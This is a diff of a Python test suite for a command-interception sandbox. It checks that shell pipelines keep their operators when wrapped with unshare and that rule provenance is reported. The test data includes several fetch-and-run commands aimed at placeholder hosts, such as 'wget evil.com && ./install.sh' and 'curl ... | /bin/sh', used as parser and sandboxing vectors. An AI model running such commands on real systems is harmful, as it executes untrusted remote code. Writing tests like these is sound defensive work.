@@ -15,9 +15,14 @@ from terminal_jail.interruptor.output import format_blocked, format_sandbox_noti
 from terminal_jail.interruptor.parser import (
     expand_variables,
     find_command_substitution,
+    operator_sequence,
     parse_command,
+    rebuild_command,
+    segment_texts,
+    structure_preserved,
 )
 from terminal_jail.interruptor.types import InterceptResult
+from terminal_jail.interruptor.userns import unshare_prefix
 
 # =============================================================================
 # Blocklist tests (T-I01 through T-I10)
@@ -205,6 +210,318 @@ class TestSandbox:
         )
 
 
+# =============================================================================
+# Aggregate sandbox reconstruction (TJ-GAP-066)
+#
+# The aggregate MODIFY path rebuilt the command with ``" ".join(segments)``,
+# so every shell operator of a sandboxed pipeline was dropped:
+#
+#   `go test ./... | tee /tmp/log`
+#     -> `unshare … bash -c 'go test ./...' tee /tmp/log`
+#
+# The `|` was gone AND `tee /tmp/log` became an ARGUMENT of the sandboxed
+# `go test` (the trailing stage never ran as a stage). The standalone wrapper
+# executes the `modified` string verbatim, so a MODIFY verdict silently ran a
+# different command than the user typed. The contract pinned below:
+#
+#   * the rebuilt command re-parses to the SAME segment count and the SAME
+#     operator sequence as the original — no operator may disappear;
+#   * an allow-listed stage stays a separate pipeline stage;
+#   * the aggregate MODIFY carries the rule id of the first rule that rewrote
+#     a segment (segment order), so provenance no longer has to be replayed
+#     from the sandbox layer.
+#
+# ``{w}`` is the host-dependent unshare prefix (userns probe: mapped or
+# legacy flags), so the expected strings stay valid on both host classes.
+# =============================================================================
+
+# (name, command, expected rule id, expected operators, expected modified)
+SANDBOX_PIPELINE_VECTORS = [
+    (
+        "go-test-pipe-tee",
+        "go test ./... | tee /tmp/log",
+        "auto-go-test",
+        ["|"],
+        "{w}'go test ./...' | tee /tmp/log",
+    ),
+    (
+        "npm-test-pipe-tail",
+        "npm test | tail -5",
+        "auto-npm-test",
+        ["|"],
+        "{w}'npm test' | tail -5",
+    ),
+    (
+        "three-stage-pipe",
+        "make | tee build.log | tail -3",
+        "auto-make",
+        ["|", "|"],
+        "{w}'make' | tee build.log | tail -3",
+    ),
+    # The board's literal `cmd 2>&1 | tee f` uses `go test` as the
+    # sandbox-matching equivalent: the aggregate MODIFY path only runs when a
+    # sandbox rule claims a segment, and `cmd` claims none. The parser splits
+    # `2>&1` into the operator tokens `2>` + `&` (with `1` as its own
+    # segment), so the pinned sequence has three entries.
+    (
+        "stderr-redirect-pipe",
+        "go test 2>&1 | tee f",
+        "auto-go-test",
+        ["2>", "&", "|"],
+        "{w}'go test' 2>&1 | tee f",
+    ),
+    (
+        "script-stderr-pipe",
+        "python3 run_tests.py 2>&1 | tee f",
+        "auto-script",
+        ["2>", "&", "|"],
+        "{w}'python3 run_tests.py' 2>&1 | tee f",
+    ),
+]
+
+
+class TestSandboxPipelineReconstruction:
+    """TJ-GAP-066: a sandboxed pipeline keeps its shell structure."""
+
+    @pytest.mark.parametrize(
+        "name,command,rule_id,operators,expected",
+        SANDBOX_PIPELINE_VECTORS,
+        ids=[v[0] for v in SANDBOX_PIPELINE_VECTORS],
+    )
+    def test_sandboxed_pipeline_keeps_its_shell_structure(
+        self,
+        name: str,
+        command: str,
+        rule_id: str,
+        operators: list[str],
+        expected: str,
+    ) -> None:
+        """MODIFY must re-emit the original operators, not re-join with spaces."""
+        result = intercept(command)
+        assert result.action == Action.MODIFY, (
+            f"pipeline {name!r} is not sandboxed: {command!r} -> {result.action}"
+        )
+        # Provenance: the aggregate MODIFY names the rule that rewrote a segment.
+        assert result.rule_id == rule_id, (
+            f"pipeline {name!r} claims the wrong rule: expected {rule_id!r}, "
+            f"got {result.rule_id!r}"
+        )
+        assert result.modified == expected.format(w=unshare_prefix()), (
+            f"pipeline {name!r} was reconstructed incorrectly:\n"
+            f"  expected {expected.format(w=unshare_prefix())!r}\n"
+            f"  got      {result.modified!r}"
+        )
+        # Structure, asserted independently of the exact string.
+        assert operator_sequence(command) == operators, (
+            f"vector {name!r} is stale: the parser sees "
+            f"{operator_sequence(command)!r}, the test pins {operators!r}"
+        )
+        assert operator_sequence(result.modified) == operators, (
+            f"pipeline {name!r} lost or gained an operator: "
+            f"{command!r} -> {result.modified!r}"
+        )
+        assert len(segment_texts(result.modified)) == len(parse_command(command)), (
+            f"pipeline {name!r} changed segment count: {command!r} -> "
+            f"{result.modified!r}"
+        )
+        # The whole-command fallback must NOT have been used: every original
+        # segment still appears in the rebuilt command.
+        for segment in parse_command(command):
+            assert segment.raw in result.modified, (
+                f"pipeline {name!r} dropped segment {segment.raw!r}: "
+                f"{result.modified!r}"
+            )
+
+    def test_trailing_stage_is_not_swallowed_as_an_argument(self) -> None:
+        """The canonical defect: `tee /tmp/log` must stay a pipeline STAGE."""
+        result = intercept("go test ./... | tee /tmp/log")
+        assert segment_texts(result.modified) == [
+            f"{unshare_prefix()}'go test ./...'",
+            "tee /tmp/log",
+        ], (
+            "`tee /tmp/log` must be a separate pipeline stage, not an argument "
+            f"of the sandboxed `go test`: {result.modified!r}"
+        )
+
+    def test_every_sandboxed_stage_is_wrapped_in_place(self) -> None:
+        """Two sandboxed stages: each gets its own wrap, the pipe survives."""
+        result = intercept("make | make -C sub")
+        assert result.rule_id == "auto-make"
+        assert result.modified == (
+            f"{unshare_prefix()}'make' | {unshare_prefix()}'make -C sub'"
+        ), f"multi-stage rebuild is wrong: {result.modified!r}"
+
+    def test_sandboxed_stage_after_an_allowed_stage_keeps_the_pipe(self) -> None:
+        """A wrap in a non-first position must not restructure the pipeline."""
+        result = intercept("cat log | python3 deploy.py")
+        assert result.action == Action.MODIFY
+        assert result.modified == (
+            f"cat log | {unshare_prefix()}'python3 deploy.py'"
+        ), f"non-first-stage rebuild is wrong: {result.modified!r}"
+
+    def test_single_command_reconstruction_is_unchanged(self) -> None:
+        """No-pipeline commands keep the exact pre-fix single-wrap spelling."""
+        result = intercept("pytest -q")
+        assert result.modified == f"{unshare_prefix()}'pytest -q'"
+        assert result.rule_id == "auto-pytest"
+
+
+class TestSandboxReconstructionRefusal:
+    """TJ-GAP-066: a reconstruction that changes structure is never shipped.
+
+    When the segments handed to ``Decider.evaluate()`` do not belong to the
+    original string, or when rebuilding would alter the operator structure,
+    the decider must degrade to a whole-command wrap (the ORIGINAL text as one
+    quoted argument, where no operator can be dropped or re-bound) instead of
+    emitting a restructured command.
+    """
+
+    def test_structure_guard_rejects_the_pre_fix_join(self) -> None:
+        """The guard must reject the exact pre-fix string (the defect)."""
+        original = "go test ./... | tee /tmp/log"
+        prefix = unshare_prefix()
+        broken = f"{prefix}'go test ./...' tee /tmp/log"
+        assert not structure_preserved(original, broken), (
+            "the structure guard accepted the pre-fix reconstruction that "
+            "drops the pipe operator"
+        )
+
+    def test_structure_guard_accepts_a_wrapped_pipeline(self) -> None:
+        """The corrected reconstruction passes the same guard."""
+        original = "go test ./... | tee /tmp/log"
+        rebuilt = f"{unshare_prefix()}'go test ./...' | tee /tmp/log"
+        assert structure_preserved(original, rebuilt)
+
+    def test_misaligned_segments_degrade_to_a_whole_command_wrap(self) -> None:
+        """Segments from a different command must not restructure the original."""
+        from terminal_jail.interruptor.config import Config
+        from terminal_jail.interruptor.decider import Decider, _escape_for_shell
+
+        command = "go test ./... | tee /tmp/log"
+        decider = Decider(Config.from_environ())
+        # One segment for a two-stage original: the alignment check fails.
+        mismatched = parse_command("go test ./...")
+        result = decider.evaluate(mismatched, command)
+
+        assert result.action == Action.MODIFY
+        assert result.modified == f"{unshare_prefix()}{_escape_for_shell(command)}", (
+            "an unaligned reconstruction must degrade to a whole-command wrap, "
+            f"never to a restructured command: {result.modified!r}"
+        )
+        # The fallback keeps the whole original inside ONE quoted argument.
+        assert operator_sequence(result.modified) == []
+        assert len(segment_texts(result.modified)) == 1
+
+    def test_escaping_hazard_degrades_to_a_whole_command_wrap(self) -> None:
+        """A rebuild the parser cannot re-read safely is refused, not shipped.
+
+        The per-segment wrap single-quotes the segment, and the escaping for an
+        embedded apostrophe (``'\\''``) is not round-trip-safe through this
+        parser: it leaves the segment's double quote open, so the rebuild
+        re-parses with the real ``|`` swallowed into a quoted token — and a
+        segment carrying a QUOTED operator re-parses with an EXTRA top-level
+        operator. The structure guard catches both, and the verdict degrades to
+        the whole-command wrap instead of shipping a rebuild.
+        """
+        from terminal_jail.interruptor.decider import _escape_for_shell
+
+        prefix = unshare_prefix()
+
+        # Guard trip, unit level: the escaping re-exposes a quoted operator.
+        segment = "bash ./x.sh 'a|b'"
+        wrapped = f"{prefix}{_escape_for_shell(segment)}"
+        assert operator_sequence(segment) == []
+        assert operator_sequence(wrapped) == ["|"]
+        assert not structure_preserved(segment, wrapped), (
+            "the guard accepted a rebuild that re-binds a quoted operator"
+        )
+
+        # Guard trip, end to end: the rebuild would swallow the real pipe.
+        command = "bash ./x.sh \"it's\" | tee out"
+        result = intercept(command)
+        assert result.action == Action.MODIFY
+        assert result.rule_id == "auto-script"
+        assert result.modified == f"{prefix}{_escape_for_shell(command)}", (
+            "an unsafe rebuild was shipped instead of the whole-command "
+            f"fallback: {result.modified!r}"
+        )
+        # The fallback is the ORIGINAL command as ONE quoted argument, so no
+        # operator can be dropped or re-bound.
+        assert operator_sequence(result.modified) == []
+        assert len(segment_texts(result.modified)) == 1
+
+    def test_rebuild_falls_back_when_the_guard_rejects(self, monkeypatch) -> None:
+        """The decider consults the guard: a rejection means the fallback."""
+        import terminal_jail.interruptor.decider as decider_module
+
+        monkeypatch.setattr(decider_module, "structure_preserved", lambda a, b: False)
+        command = "go test ./... | tee /tmp/log"
+        result = intercept(command)
+        assert result.modified == f"{unshare_prefix()}'{command}'", (
+            f"guard rejection did not fall back: {result.modified!r}"
+        )
+
+
+class TestCommandRebuild:
+    """Parser-level reconstruction helpers used by the aggregate MODIFY path."""
+
+    def test_nothing_replaced_is_copied_verbatim(self) -> None:
+        command = "go  test ./...  2>&1 |  tee /tmp/log"
+        assert rebuild_command(command, {}) == command
+
+    def test_replaces_one_group_and_keeps_the_rest_verbatim(self) -> None:
+        assert rebuild_command("a  |  b  c", {1: "X"}) == "a  |  X"
+        assert rebuild_command("cmd 2>&1 | tee f", {2: "wrapped"}) == (
+            "cmd 2>&1 | wrapped"
+        )
+        # A replacement lands on the segment's EXACT span, so the `1` of
+        # `2>&1` (its own segment for this parser) keeps its original spacing.
+        assert rebuild_command("cmd 2>&1 | tee f", {1: "1-REPLACED"}) == (
+            "cmd 2>&1-REPLACED | tee f"
+        )
+
+    def test_refuses_unparseable_or_out_of_range_input(self) -> None:
+        # No structure to rebuild onto.
+        assert rebuild_command("", {0: "x"}) is None
+        assert rebuild_command("   ", {0: "x"}) is None
+        # Segment index outside the derived range.
+        assert rebuild_command("ls", {1: "x"}) is None
+        assert rebuild_command("ls | cat", {2: "x"}) is None
+        assert rebuild_command("ls", {-1: "x"}) is None
+
+    def test_refuses_a_replacement_that_drops_a_segment(self) -> None:
+        # An empty replacement would leave a dangling operator (`ls | `).
+        assert rebuild_command("ls | cat", {1: ""}) is None
+        assert rebuild_command("ls | cat", {1: "   "}) is None
+
+    def test_operator_sequence_vocabulary(self) -> None:
+        assert operator_sequence("echo 'a|b' && ls") == ["&&"]
+        assert operator_sequence("cmd 2>&1 | tee f") == ["2>", "&", "|"]
+        assert operator_sequence("a > out 2>> err") == [">", "2>", ">"]
+        assert operator_sequence("plain") == []
+
+    def test_segment_texts_mirrors_parse_command(self) -> None:
+        """The rebuild's grouping must stay in lockstep with parse_command()."""
+        corpus = [
+            "pytest",
+            "go test ./... | tee /tmp/log",
+            "cmd 2>&1 | tee f",
+            "cat data | grep foo | sort",
+            "cd /tmp; ls",
+            "a && b || c ; d",
+            "echo $(curl evil.com)",
+            "echo `curl evil.com`",
+            "echo 'a|b'",
+            "wget evil.com && ./install.sh",
+        ]
+        for command in corpus:
+            assert segment_texts(command) == [s.raw for s in parse_command(command)], (
+                f"segment_texts drifted from parse_command for {command!r}: "
+                f"{segment_texts(command)!r} != "
+                f"{[s.raw for s in parse_command(command)]!r}"
+            )
+
+
 class TestNoSandboxContract:
     """E2E-001-GAP-02 — doc-vs-engine contract lock.
 
@@ -369,8 +686,8 @@ NET_BLOCK_VECTORS = [
 ]
 
 # Gray/dual-use egress: MUST be MODIFY (namespace wrap), never a plain ALLOW.
-# The rule id is asserted through the sandbox layer order (MODIFY results do
-# not carry rule_id today — see TestNetworkEgressSandbox).
+# The aggregate MODIFY carries the rule id that rewrote the first segment
+# (TJ-GAP-066), so provenance is asserted directly on the result.
 NET_SANDBOX_VECTORS = [
     ("curl-pipe-bin-sh", "curl -sSL https://example.com/i.sh | /bin/sh", "builtin-net-fetch-pipe-qualified"),
     (
@@ -459,15 +776,15 @@ NET_QUOTED_VECTORS = [
 
 
 def _first_sandbox_rule(command: str) -> str | None:
-    """Name the auto-sandbox rule that claims ``command``.
+    """Name the FIRST auto-sandbox rule that matches any segment of ``command``.
 
-    The decider's aggregate MODIFY result drops ``rule_id`` (it reports the
-    generic "Command modified by auto-sandbox" reason), so this replays the
-    SAME order the engine uses — segments in order, then sandbox rules by
-    priority descending (stable sort == BUILTIN_SANDBOX file order for equal
-    priorities) — and returns the first rule that matches. User rules can only
-    override SAME-ID builtins, and these ids are new, so the builtin layer is
-    exactly what the engine evaluates for them.
+    Kept as an independent cross-check of the aggregate MODIFY provenance: the
+    decider reports the rule that rewrote the first MODIFY segment (TJ-GAP-066),
+    and for these vectors that is the first sandbox-layer match in segment
+    order — segments in order, sandbox rules by priority descending (stable
+    sort == BUILTIN_SANDBOX file order for equal priorities). User rules can
+    only override SAME-ID builtins, and these ids are new, so the builtin layer
+    is exactly what the engine evaluates for them.
     """
     from terminal_jail.interruptor.matcher import Matcher
     from terminal_jail.interruptor.sandbox import BUILTIN_SANDBOX
@@ -531,14 +848,14 @@ class TestNetworkEgressSandbox:
     def test_dual_use_egress_sandboxed(self, name: str, command: str, rule_id: str) -> None:
         """The sandbox verdict: action MODIFY + a namespace-wrapped command.
 
-        Rule-id provenance is asserted separately (``_first_sandbox_rule``)
-        because the decider's aggregate MODIFY result carries no rule_id —
-        same class of gap DF-TERMINAL-JAIL-12 closed for ALLOW verdicts.
+        Provenance comes straight off the result (TJ-GAP-066): the aggregate
+        MODIFY carries the rule that rewrote the first segment, so no caller
+        has to replay the sandbox layer to learn it. ``_first_sandbox_rule``
+        stays as an INDEPENDENT cross-check of that claim.
         The wrap prefix itself is host-dependent (userns probe), so the
         assertion is "a different, wrapped command came back", not a literal
-        prefix — and NOT ``command in modified``: for a PIPELINE the decider
-        re-joins segments with a space, dropping the ``|`` (pre-existing,
-        affects every sandbox rule, reported as a separate finding).
+        prefix — and the pipeline vectors now prove the operators survive the
+        rebuild (see TestSandboxPipelineReconstruction).
         """
         result = intercept(command)
         assert result.action == Action.MODIFY, (
@@ -548,6 +865,10 @@ class TestNetworkEgressSandbox:
         assert result.modified, f"sandboxed {name!r} returned no wrapped command"
         assert result.modified != command, (
             f"sandboxed {name!r} came back unchanged: {result.modified!r}"
+        )
+        assert result.rule_id == rule_id, (
+            f"dual-use egress {name!r} reports provenance {result.rule_id!r}, "
+            f"expected {rule_id!r}"
         )
         assert _first_sandbox_rule(command) == rule_id, (
             f"dual-use egress {name!r} is not claimed by {rule_id!r}: "
@@ -912,13 +1233,16 @@ rules:
             f"Expected MODIFY for 'danger-tool --wipe', got {result.action} "
             f"(rule={result.rule_id!r})"
         )
-        # Note: the decider's evaluate() aggregates per-segment MODIFY
-        # results without preserving rule_id (pre-existing behaviour,
-        # same as the builtin sandbox path) — assert action + payload.
+        # The aggregate MODIFY carries the rule that rewrote the segment
+        # (TJ-GAP-066) — assert both the payload and the provenance.
         assert result.modified is not None
-        assert result.modified.startswith(
-            "unshare --user --pid --fork --kill-child=SIGKILL bash -c "
-        ), f"modified payload should carry the unshare prefix, got {result.modified!r}"
+        assert result.rule_id == "user-modify-danger-tool", (
+            f"aggregate MODIFY lost its provenance: {result.rule_id!r}"
+        )
+        assert result.modified.startswith(f"{unshare_prefix()}'"), (
+            f"modified payload should carry the unshare prefix, "
+            f"got {result.modified!r}"
+        )
         assert "danger-tool --wipe" in result.modified
 
     def test_same_id_override_builtin_blocklist(self, tmp_path) -> None:
@@ -1357,17 +1681,17 @@ class TestQuotedArgvBypass:
         an unshare namespace. The matcher's normalise-and-search keeps
         the modify contract intact.
 
-        Note: the decider's top-level ``evaluate()`` aggregates per-
-        segment MODIFY results into a single InterceptResult without
-        preserving the per-segment ``rule_id`` (a pre-existing
-        behaviour, not introduced by this fix), so we assert on
-        ``action`` and the ``modified`` payload instead.
+        The aggregate MODIFY reports the rule that rewrote the segment
+        (TJ-GAP-066), so provenance is asserted on the result too.
         """
         result = intercept("'pytest' '--version'")
         assert result.action == Action.MODIFY, (
             f"Expected MODIFY for 'pytest --version' (quoted), got "
             f"{result.action} (rule={result.rule_id!r}) — modify path "
             f"broken by quote-stripping"
+        )
+        assert result.rule_id == "auto-pytest", (
+            f"Expected the auto-pytest provenance, got {result.rule_id!r}"
         )
         assert result.modified is not None, (
             "MODIFY result must include a non-null `modified` payload"
